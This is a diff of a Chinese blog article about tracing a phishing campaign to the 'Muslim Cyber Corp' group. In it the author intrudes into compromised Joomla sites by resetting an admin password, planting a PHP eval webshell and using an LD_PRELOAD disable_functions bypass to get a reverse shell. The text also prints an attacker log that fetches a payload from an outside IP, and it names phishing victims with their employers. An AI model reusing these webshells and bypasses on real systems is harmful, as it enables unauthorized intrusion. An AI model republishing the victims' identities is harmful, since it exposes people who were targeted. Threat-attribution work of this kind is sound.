@@ -12,7 +12,7 @@
 <meta name="generator" content="Hugo 0.69.0-DEV" />
 
 
-<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/poal-jsdelivr@1.2.0/favicons/favicon.ico" />
+<link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/amzrk2/cdn-stcapi@1/favicons/favicon.ico" />
 
 
 <title>如何通过一封恶意邮件追踪幕后黑客组织 - 深邃之眼</title>
@@ -24,8 +24,14 @@
 <meta name="description" content="A minimal Hugo theme with nice theme color." />
 
 
+<meta name="keywords" content="红队研究" />
+
 <meta property="og:title" content="如何通过一封恶意邮件追踪幕后黑客组织" />
-<meta property="og:description" content="作者：道明君 博客：https://xeye.io 公众号：深邃之眼 声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。 一、前言 近日朋友收到一封来自海外的钓鱼邮件，" />
+<meta property="og:description" content="
+声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。
+
+一、前言
+近日朋友收到一封来自海外的钓鱼邮件，委托我帮忙分析。因此我对钓鱼者身份和攻击路径进行了一次详细的溯源。大致摸清了攻击者组织身份、攻击手法以及动机。本次溯源工作主要是通过提取攻击者控制的肉鸡服务器、网站访问日志、攻击者后门特征等。关联分析这些日志和特征最终得到攻击者的身份信息。本文以流水账的方式，详细记录整个溯源过程，包括分析手法和思路，以供安全研究人员参考。" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://xeye.io/post/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E4%B8%80%E5%B0%81%E6%81%B6%E6%84%8F%E9%82%AE%E4%BB%B6%E8%BF%BD%E8%B8%AA%E5%B9%95%E5%90%8E%E9%BB%91%E5%AE%A2%E7%BB%84%E7%BB%87/" />
 <meta property="og:image" content="https://xeye.io/img/og.png"/>
@@ -36,7 +42,11 @@
 <meta name="twitter:image" content="https://xeye.io/img/og.png"/>
 
 <meta name="twitter:title" content="如何通过一封恶意邮件追踪幕后黑客组织"/>
-<meta name="twitter:description" content="作者：道明君 博客：https://xeye.io 公众号：深邃之眼 声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。 一、前言 近日朋友收到一封来自海外的钓鱼邮件，"/>
+<meta name="twitter:description" content="
+声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。
+
+一、前言
+近日朋友收到一封来自海外的钓鱼邮件，委托我帮忙分析。因此我对钓鱼者身份和攻击路径进行了一次详细的溯源。大致摸清了攻击者组织身份、攻击手法以及动机。本次溯源工作主要是通过提取攻击者控制的肉鸡服务器、网站访问日志、攻击者后门特征等。关联分析这些日志和特征最终得到攻击者的身份信息。本文以流水账的方式，详细记录整个溯源过程，包括分析手法和思路，以供安全研究人员参考。"/>
 
 
 
@@ -56,6 +66,8 @@
 <link rel="stylesheet" href="/assets/css/fuji.min.css" />
 
 
+<script async type="module" src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.esm.js"></script>
+<script async nomodule src="https://cdn.jsdelivr.net/npm/ionicons@5.0.1/dist/ionicons/ionicons.js"></script>
 
 
 
@@ -95,7 +107,7 @@
         <div class="col-12 header">
             <a class="title-main" href="https://xeye.io">深邃之眼</a>
             
-            <span class="title-sub">君子有所为有所不为。</span>
+            <span class="title-sub">拨开迷雾看世界</span>
             
         </div>
     </div>
@@ -112,15 +124,12 @@
         <a href="https://xeye.io/post/%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E4%B8%80%E5%B0%81%E6%81%B6%E6%84%8F%E9%82%AE%E4%BB%B6%E8%BF%BD%E8%B8%AA%E5%B9%95%E5%90%8E%E9%BB%91%E5%AE%A2%E7%BB%84%E7%BB%87/">如何通过一封恶意邮件追踪幕后黑客组织</a>
     </h2>
     <div class="post-item post-meta">
-        <span><ion-icon name="today"></ion-icon>&nbsp;2019-11-02</span><span><ion-icon name="file-tray"></ion-icon>&nbsp;10095 words</span><span><ion-icon name="pricetags"></ion-icon>&nbsp;No tag</span>
+        <span><ion-icon name="today"></ion-icon>&nbsp;2019-11-02</span><span><ion-icon name="file-tray"></ion-icon>&nbsp;10063 words</span><span><ion-icon name="pricetags"></ion-icon>&nbsp;<a href="/tags/%E7%BA%A2%E9%98%9F%E7%A0%94%E7%A9%B6">红队研究</a>&nbsp;</span>
     </div>
     
     
     <div class="post-content markdown-body">
         <blockquote>
-<p>作者：道明君</p>
-<p>博客：https://xeye.io</p>
-<p>公众号：深邃之眼</p>
 <p>声明：本文曾经发表在FreeBuf，文章分享的思路与方法仅供信息安全同行研究，请勿用于非法。</p>
 </blockquote>
 <h2 id="一前言">一、前言</h2>
@@ -128,9 +137,8 @@
 <hr>
 <h2 id="二信息收集">二、信息收集</h2>
 <p>这是一封冒充 Microsoft Outlook WebApp 密码过期的钓鱼邮件：</p>
-<p><a href="https://xeye.io/static/images/20200713153957.jpeg" target="_blank">
-    <img src="https://xeye.io/static/images/20200713153957.jpeg" alt="钓鱼邮件1.jpg-172.9kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713153957.jpeg" alt="钓鱼邮件1.jpg-172.9kB" />
+</p>
 <h3 id="21-邮件正文">2.1 <strong>邮件正文：</strong></h3>
 <pre><code>Received: from sysmailout1.platon.sk (unknown [85.248.228.17])
 	by bizmx16.qq.com (NewMx) with SMTP id 
@@ -200,30 +208,24 @@ immediateIy.&lt;span class=3D&quot;Apple-converted-space&quot;&gt; &lt;br&gt;
 </blockquote>
 <p>访问钓鱼链接，一个克隆OWA修改密码的的虚假页面，我们按照正常流程走一遍，密码随便输入。不出所料页面提示密码错误，这么做可以收集受害者多个密码提高成功率，仔细想想这个功能还是很贴心的：）。</p>
 <p><strong>Step 1</strong></p>
-<p><a href="https://xeye.io/static/images/20200713154111.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713154111.png" alt="钓鱼邮件页面1.png-45.6kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713154111.png" alt="钓鱼邮件页面1.png-45.6kB" />
+</p>
 <p><strong>Step 2</strong></p>
-<p><a href="https://xeye.io/static/images/20200713154136.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713154136.png" alt="钓鱼邮件页面3.png-50.6kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713154136.png" alt="钓鱼邮件页面3.png-50.6kB" />
+</p>
 <p><strong>Step 3</strong></p>
-<p><a href="https://xeye.io/static/images/20200713154152.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713154152.png" alt="钓鱼邮件页面2.png-35.6kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713154152.png" alt="钓鱼邮件页面2.png-35.6kB" />
+</p>
 <hr>
 <p><strong>抓包如下：</strong> 注入、跨站之流都是不存在的。</p>
-<p><a href="https://xeye.io/static/images/20200713175753.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713175753.png" alt="钓鱼页面表单提交抓包.png-205.9kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713175753.png" alt="钓鱼页面表单提交抓包.png-205.9kB" />
+</p>
 <p>访问首页，这是一家俄罗斯的塑料水管厂商，攻击者入侵了这个网站，放置了钓鱼页面，再通过邮件传播。</p>
-<p><a href="https://xeye.io/static/images/20200713180108.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180108.png" alt="Screenshot-2018-12-11 RTP – Russian manufacturer of plastic pipes and fittings – High Quality Pipes and Fittings.png-1622.7kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180108.png" alt="Screenshot-2018-12-11 RTP – Russian manufacturer of plastic pipes and fittings – High Quality Pipes and Fittings.png-1622.7kB" />
+</p>
 <p><strong>端口扫描显示开放了一堆端口，防火墙做了策略限制。</strong></p>
-<p><a href="https://xeye.io/static/images/20200714092659.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200714092659.png" alt="nmap-rosturplast.com-carbon.png-397.3kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200714092659.png" alt="nmap-rosturplast.com-carbon.png-397.3kB" />
+</p>
 <p><strong>通过扫描分析，得到沦陷主机信息如下:</strong></p>
 <blockquote>
 <p>[+] HOST: <a href="http://www.rosturplast.com/" target="_blank">www.rosturplast.com</a> （137.74.81.5 法国）</p>
@@ -232,13 +234,11 @@ immediateIy.&lt;span class=3D&quot;Apple-converted-space&quot;&gt; &lt;br&gt;
 <p>[+] CMS: Joomla 3.3.3 （Joomla!是一套海外流行的建站系统，基于PHP+MySQL开发）</p>
 </blockquote>
 <p><strong>这是一个低版本的Joomla，joomscan扫描显示受害网站有一堆漏洞，看起来弱不禁风，Getshell指日可待。</strong></p>
-<p><a href="https://xeye.io/static/images/20200713180338.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180338.png" alt="joomscan-rosturplast.png-995.8kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180338.png" alt="joomscan-rosturplast.png-995.8kB" />
+</p>
 <p>扫描发现PHPMailer RCE漏洞，不过需要邮件发送表单功能才能利用，这一堆漏洞里面，看起来唯一有机会的是CVE-2016-9838（Joomla! Core Remote Privilege Escalation Vulnerability），然而经过测试攻击者（丧心病狂）贴心的把用户注册页面删除了！堵住了漏洞，导致无法利用。</p>
-<p><a href="https://xeye.io/static/images/20200713180428.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180428.png" alt="FireShot Capture .png-146.7kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180428.png" alt="FireShot Capture .png-146.7kB" />
+</p>
 <p>机智的我（此时毫无办法），开始挂字典整合Joomla目录盲扫备份文件，最后发现目标存在PhpMyAdmin后台，和一个报错页面，页面显示了网站绝对路径和疑似以日期格式生成的网站备份的文件名。</p>
 <pre><code>/var/www/rosturpl/data/www/rosturplast.com/rosturplast.com.2015-11-11.zip
 </code></pre>
@@ -265,12 +265,10 @@ wget $url
 done
 </code></pre>
 <p>脚本大概跑了一个下午，当到达2017-08-07的时候，响应200状态码，看到rosturplast.com.2017-08-07.zip的文件大小为177M 感觉成了，解压后果然是整站备份，果然是柳暗花明又一shell。</p>
-<p><a href="https://xeye.io/static/images/20200713180509.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180509.png" alt="wget-rosturp.png-864.5kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713180529.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180529.png" alt="2018-12-01 05-18-10屏幕截图.png-159.4kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180509.png" alt="wget-rosturp.png-864.5kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180529.png" alt="2018-12-01 05-18-10屏幕截图.png-159.4kB" />
+</p>
 <p>查看配置文件<code>configuration.php</code>得到数据库连接信息，登录PhpMyAdmin后台。低权限无法直接写shell，只能修改默认密码登录Joomla!后台。</p>
 <pre><code>public $dbtype = 'mysqli';
 public $host = 'localhost';
@@ -281,34 +279,28 @@ public $dbprefix = 'ms8ef_';
 public $live_site = '';
 public $secret = '5qp******4zU';     //敏感信息打码    
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713180548.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180548.png" alt="rosturp.configuration-.png-708.2kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713180614.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180614.png" alt="rosturplast.com-phpmyadmin (1).png-136.6kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180548.png" alt="rosturp.configuration-.png-708.2kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180614.png" alt="rosturplast.com-phpmyadmin (1).png-136.6kB" />
+</p>
 <p>备份原始密文以备还原，将后台密码修改为 test123456XYZ</p>
 <pre><code>http://www.rosturplast.com/administrator/
 admin / test123456XYZ
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713180632.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180632.png" alt="joomla-manager1.png-132.6kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180632.png" alt="joomla-manager1.png-132.6kB" />
+</p>
 <p>登录后台，通过模板写入WebShell</p>
 <blockquote>
 <p>Extensions &mdash;&gt; Template Manager &mdash;&gt; Template &mdash;&gt; New Files &mdash;&gt; PHP WebSehll</p>
 </blockquote>
-<p><a href="https://xeye.io/static/images/20200713180643.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180643.png" alt="joomla-getshell1.png-83.2kB" />
-</a> 这里写入了PHP一句话WebShell，通过Cknife（java版中国菜刀）对网站进行控制。</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180643.png" alt="joomla-getshell1.png-83.2kB" />
+ 这里写入了PHP一句话WebShell，通过Cknife（java版中国菜刀）对网站进行控制。</p>
 <pre><code>&lt;?php @eval($_POST['cmd']);?&gt;
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713180656.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180656.png" alt="2018-11-29 13-04-43屏幕截图.png-140.1kB" />
-</a></p>
-<p>查看攻击者的钓鱼文件目录，<code>user.txt</code> 详细记录了上钩的受害者信息。 <a href="https://xeye.io/static/images/20200713180710.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180710.png" alt="rostruplast.com-user.txt-.png-138kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180656.png" alt="2018-11-29 13-04-43屏幕截图.png-140.1kB" />
+</p>
+<p>查看攻击者的钓鱼文件目录，<code>user.txt</code> 详细记录了上钩的受害者信息。 <img class="img-zoomable" src="https://xeye.io/static/images/20200713180710.png" alt="rostruplast.com-user.txt-.png-138kB" />
+</p>
 <h3 id="34-日志分析"><strong>3.4 日志分析</strong></h3>
 <p>将网站文件和访问日志下载到本地分析</p>
 <pre><code>[/tmp]$ tar zcvf /var/www/rosturpl/data/www/rosturplast.com/log.tar.gz /var/www/rosturpl/data/access-logs /var/www/rosturpl/data/logs/rosturplast*
@@ -345,13 +337,11 @@ wget -c http://www.rosturplast.com/log.tar.gz &amp;&amp; wget -c http://www.rost
 -rw-rw---- 1 48 6313 1.4M 11月 30 08:38 rosturplast.com.error.log-20181130
 </code></pre>
 <p>用D盾扫网站文件，发现这个网站已成跑马场。</p>
-<p><a href="https://xeye.io/static/images/20200713180835.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180835.png" alt="2018-11-30 17-00-28屏幕截图.png-59.9kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180835.png" alt="2018-11-30 17-00-28屏幕截图.png-59.9kB" />
+</p>
 <p><strong>攻击者在<code>shells/</code>目录下放置钓鱼文件和PHP后门。</strong></p>
-<p><a href="https://xeye.io/static/images/20200713180854.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713180854.png" alt="rosturplast.com-shells-ls.png-306.7kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713180854.png" alt="rosturplast.com-shells-ls.png-306.7kB" />
+</p>
 <p><strong>查看哪些IP访问了后门并统计次数</strong></p>
 <p><strong>查询攻击者IP地址</strong></p>
 <pre><code> ⚡ root@kali  /tmp/rosturplast.com/log  grep &quot;/shells/&quot; * |grep &quot;php&quot; | awk -F &quot;:&quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]&quot; &quot;i;}}' |sort -t &quot; &quot; -k 1 -n -r  &gt;ip.txt
@@ -411,24 +401,20 @@ url@email.com                   //无效
 <blockquote>
 <blockquote>
 <p>来源：http://www.payer.org/test/ 来源：https://avoidaclaim.com/2018/debt-collection-fraud-using-the-name-yeung-alexander-luk/</p>
-<p><a href="https://xeye.io/static/images/20200713181021.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181021.png" alt="alexsin54@yahoo.com-欺诈账户.png-124.7kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713181039.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181039.png" alt="alexsin54@yahoo.com-欺诈账户2.png-196.4kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181021.png" alt="alexsin54@yahoo.com-欺诈账户.png-124.7kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181039.png" alt="alexsin54@yahoo.com-欺诈账户2.png-196.4kB" />
+</p>
 </blockquote>
 </blockquote>
 <h4 id="352-clavendapaymanlbdinetmailtoclavendapaymanlbdinet">3.5.2 <a href="mailto:clavenda.payman@lbdi.net">clavenda.payman@lbdi.net</a></h4>
 <blockquote>
 <blockquote>
 <p>Mrs. Clavenda O. PAYMAN 利比亚发展投行（Liberian Bank forDevelopment and nvestment）首席财务官 来源：https://www.adfi-ci.org/downloads/telecharger.php?Fichier_a_telecharger=files/aadfi_doc_en_20130623170205.pdf&amp;chemin=&amp;id=91</p>
-<p><a href="https://xeye.io/static/images/20200713181107.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181107.png" alt="clavenda.payman@lbdi.net-1.png-86kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713181052.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181052.png" alt="clavenda.payman@lbdi.net-2.png-169.6kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181107.png" alt="clavenda.payman@lbdi.net-1.png-86kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181052.png" alt="clavenda.payman@lbdi.net-2.png-169.6kB" />
+</p>
 </blockquote>
 </blockquote>
 <h4 id="353-georgesraadneranetmailtogeorgesraadneranet">3.5.3 <a href="mailto:georges.raad@nera.net">georges.raad@nera.net</a></h4>
@@ -446,9 +432,8 @@ url@email.com                   //无效
 <blockquote>
 <blockquote>
 <p>来源： [http://www.seepz.gov.in/writereaddatafolder/Regional%20Governing%20Council%20of%20EPCES%20for%202016-18.pdf](<a href="http://www.seepz.gov.in/writereaddatafolder/Regional">http://www.seepz.gov.in/writereaddatafolder/Regional</a> Governing Council of EPCES for 2016-18.pdf)</p>
-<p><a href="https://xeye.io/static/images/20200713181131.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181131.png" alt="gthakkar@sscinc.com1.png-169.5kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181131.png" alt="gthakkar@sscinc.com1.png-169.5kB" />
+</p>
 </blockquote>
 </blockquote>
 <h4 id="355-jiajielimcimbcommailtojiajielimcimbcom">3.5.5 <a href="mailto:jiajie.lim@cimb.com">jiajie.lim@cimb.com</a></h4>
@@ -466,18 +451,16 @@ url@email.com                   //无效
 <blockquote>
 <blockquote>
 <p>来源：https://www.bdo.com.sg/en-gb/our-people/koh-chin-beng</p>
-<p><a href="https://xeye.io/static/images/20200713181144.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181144.png" alt="kohchinbeng@bdo.com.sg-1.png-263.7kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181144.png" alt="kohchinbeng@bdo.com.sg-1.png-263.7kB" />
+</p>
 </blockquote>
 </blockquote>
 <h4 id="357-philipbeekoohkmailtophilipbeekoohk">3.5.7 <a href="mailto:philip@beekoo.hk">philip@beekoo.hk</a></h4>
 <blockquote>
 <blockquote>
 <p>深圳市很有蜂格网络科技有限公司 CEO 来源：https://m.zhipin.com/job_detail/1407383492.html 来源：https://www.tianyancha.com/company/2349004659</p>
-<p><a href="https://xeye.io/static/images/20200713181200.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181200.png" alt="philip@beekoo.hk-1.png-101.3kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181200.png" alt="philip@beekoo.hk-1.png-101.3kB" />
+</p>
 </blockquote>
 </blockquote>
 <h2 id="四渗透邮件发送网站">四、渗透邮件发送网站</h2>
@@ -492,17 +475,14 @@ url@email.com                   //无效
 [+] OS: Debian 7
 [+] Web Server:Apache/2.2.22 PHP/5.2.6-1+lenny16
 [+] CMS: Joomla 1.5</p>
-<p><a href="https://xeye.io/static/images/20200713181220.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181220.png" alt="nmap-mirohaviar.sk-1.png-123.2kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181220.png" alt="nmap-mirohaviar.sk-1.png-123.2kB" />
+</p>
 </blockquote>
-<p><a href="https://camo.githubusercontent.com/ca7876c11cad706f5751e457ad5612fa2c36038e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f706c6135763177796f3337683035746c6e326272777135772f6a6f6f6d7363616e2d316d69726f6861766961722e736b2e706e67" target="_blank">
-    <img src="https://camo.githubusercontent.com/ca7876c11cad706f5751e457ad5612fa2c36038e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f706c6135763177796f3337683035746c6e326272777135772f6a6f6f6d7363616e2d316d69726f6861766961722e736b2e706e67" alt="joomscan-1mirohaviar.sk.png-660.5kB" />
-</a> CMS漏洞扫描得到图示的漏洞信息，经过测试全部无法利用，其他端口也没有发现可以利用的的漏洞，看来攻击者也是一个勤奋的同学，入侵成功后做了相应的修复和加固，看起来毫无办法，好像只能旁站或者C段渗透了。</p>
+<p><img class="img-zoomable" src="https://camo.githubusercontent.com/ca7876c11cad706f5751e457ad5612fa2c36038e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f706c6135763177796f3337683035746c6e326272777135772f6a6f6f6d7363616e2d316d69726f6861766961722e736b2e706e67" alt="joomscan-1mirohaviar.sk.png-660.5kB" />
+ CMS漏洞扫描得到图示的漏洞信息，经过测试全部无法利用，其他端口也没有发现可以利用的的漏洞，看来攻击者也是一个勤奋的同学，入侵成功后做了相应的修复和加固，看起来毫无办法，好像只能旁站或者C段渗透了。</p>
 <p>然而有人的地方就有江湖，有黑客入侵过的网站一定有后门。这类利用通用漏洞批量入侵的黑客团伙，后门文件一般都有特征，我根据前一个网站获得的php后门文件名列表，批量访问当前网站得到了三个相同的后门文件。</p>
-<p><a href="https://xeye.io/static/images/20200713181236.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181236.png" alt="rosturplast.com-shells-1.png-169.4kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181236.png" alt="rosturplast.com-shells-1.png-169.4kB" />
+</p>
 <pre><code> ⚡ root@kali  /tmp/rosturplast.com/webroot/shells  md5sum *         
 724e7316427151ea1f449f38a28f642c  406.php
 3e8a7cf7049e8b9ab8dfca7d3c827c4a  aaaa
@@ -549,15 +529,13 @@ awk -F &quot;\&quot;&quot; '{print $2}' config.php| base64 -d -i|awk -F &quot;\&
 
 //第五次base64解码，得到明文
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713181252.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181252.png" alt="PHP后门解密过程1.png-3103.9kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181252.png" alt="PHP后门解密过程1.png-3103.9kB" />
+</p>
 <p>得到后门密码hash（MD5），解密后得到明文: root （饶了个大弯原来是个弱口令，下次遇到这类先跑一下密码）</p>
 <pre><code>$auth_pass = &quot;63a9f0ea7bb98050796b649e85481845&quot;;  
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713181315.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181315.png" alt="2019-01-24 12-22-41屏幕截图.png-17.3kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181315.png" alt="2019-01-24 12-22-41屏幕截图.png-17.3kB" />
+</p>
 <p>这个后门有点皮，做了UserAgent判断，我浏览器默认设置的UA是Googlebot，访问显示404，这是反搜索引擎爬虫的惯用手段，所以我换了个正常浏览器的UA访问得到正常页面。</p>
 <pre><code>if(!empty($_SERVER['HTTP_USER_AGENT'])) {
     $userAgents = array(&quot;Google&quot;, &quot;Slurp&quot;, &quot;MSNBot&quot;, &quot;ia_archiver&quot;, &quot;Yandex&quot;, &quot;Rambler&quot;);
@@ -567,24 +545,21 @@ awk -F &quot;\&quot;&quot; '{print $2}' config.php| base64 -d -i|awk -F &quot;\&
     }
 }
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713181325.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181325.png" alt="mirohaviar.sk-config.php-shell.png-13.4kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181325.png" alt="mirohaviar.sk-config.php-shell.png-13.4kB" />
+</p>
 <hr>
 <h3 id="43-提权"><strong>4.3 提权</strong></h3>
 <p>通过webshell得到了具体系统信息，下一步尝试提权，目的是获得Apache的web访问日志。</p>
-<p><a href="https://xeye.io/static/images/20200713181334.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181334.png" alt="mir-sysinfo.png-118.7kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181334.png" alt="mir-sysinfo.png-118.7kB" />
+</p>
 <h4 id="431-突破disable_functions"><strong>4.3.1 突破disable_functions</strong></h4>
 <p>测试发现目标限制跨目录（open_basedir），并禁用了命令执行函数，导致WebShell权限下，无法跨目录访问也无法执行命令。</p>
 <pre><code>disable_functions：	 escapeshellarg,escapeshellcmd,exec,passthru,proc_close,proc_get_status,proc_nice,proc_open,proc_terminate,shell_exec,system,popen,pcntl_exec	
 
 open_basedir：	/storage/www/mirohaviar.sk/:/storage/www-include/:/usr/share/php5/:/usr/share/file/:/usr/share/pear/:/tmp/
 </code></pre>
-<p><a href="https://xeye.io/static/images/20200713181346.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181346.png" alt="mir-disable_functions.png-60.7kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181346.png" alt="mir-disable_functions.png-60.7kB" />
+</p>
 <blockquote>
 <p>突破的手段很多，这里我利用LD_PRELOAD动态链接来劫持php的mail函数突破disable_functions执行系统命令。</p>
 </blockquote>
@@ -639,14 +614,12 @@ mail(&quot;test@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&qu
 ?&gt;
 </code></pre>
 <p>浏览器访问<code>http://www.mirohaviar.sk/bypass.php</code>页面后成功执行命令，得到了一个www-user权限的反弹shell。</p>
-<p><a href="https://xeye.io/static/images/20200713181401.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181401.png" alt="mir-nc.png-57.1kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181401.png" alt="mir-nc.png-57.1kB" />
+</p>
 <h4 id="432-发现行踪"><strong>4.3.2 发现行踪</strong></h4>
 <p>仔细看这是一家斯洛伐克的网络公司，这台服务器上面托管了五百多个网站，当前的权限可以访问这些网站的文件和数据库，令人遗憾的的是apache日志目录<code>/var/log/apache2/</code>无权限访问。</p>
-<p><a href="https://xeye.io/static/images/20200713181412.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181412.png" alt="mir-site.png-112.8kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181412.png" alt="mir-site.png-112.8kB" />
+</p>
 <p>不过我在<code>/tmp</code>目录下面发现了一个有趣的日志文件。</p>
 <pre><code>[/tmp/]$cat w
 --2018-11-26 04:49:06--  http://187.85.134.4/cacat/mm.tgz
@@ -675,36 +648,27 @@ Saving to: 'mm.tgz'
 2018-11-26 04:49:10 (577 KB/s) - 'mm.tgz' saved [769309/769309]
 </code></pre>
 <h3 id="44-追踪"><strong>4.4 追踪</strong></h3>
-<p>根据泄露日志，使用谷歌搜索关键字：<code>http://187.85.134.4</code>，发现了一个历史页面。 <a href="https://xeye.io/static/images/20200713181427.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181427.png" alt="2019-01-21 18-19-42屏幕截图.png-106.2kB" />
-</a></p>
-<p><a href="https://xeye.io/static/images/20200713181446.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181446.png" alt="2019-01-21 18-29-31屏幕截图.png-34.3kB" />
-</a></p>
+<p>根据泄露日志，使用谷歌搜索关键字：<code>http://187.85.134.4</code>，发现了一个历史页面。 <img class="img-zoomable" src="https://xeye.io/static/images/20200713181427.png" alt="2019-01-21 18-19-42屏幕截图.png-106.2kB" />
+</p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181446.png" alt="2019-01-21 18-29-31屏幕截图.png-34.3kB" />
+</p>
 <p>这是一个已经被删除的后门页面，刚好被谷歌爬虫收录了，进一步搜索一下这个后门参数的关键字： <code>inurl:bc.php?filesrc=</code>，得到了多条后门记录。</p>
-<p><a href="https://xeye.io/static/images/20200713181540.png" target="_blank">
-    <img src="https://xeye.io/static/images/20200713181540.png" alt="2019-01-21 18-33-46屏幕截图.png-197.6kB" />
-</a></p>
+<p><img class="img-zoomable" src="https://xeye.io/static/images/20200713181540.png" alt="2019-01-21 18-33-46屏幕截图.png-197.6kB" />
+</p>
 <p>其中多个WebShell缓存页面内容跟上一个被黑网站的临时目录中发现的日志内容吻合，疑似自动化攻击留下的日志，WebShell底部署名：<code>Muslim Cyber Corp - Mujahidin Cyber Army - Family Attack Cyber</code> ，表明后门均为这个黑客组织所有。</p>
-<p><a href="https://xeye.io/static/images/20200713181553.png" target="_blank">
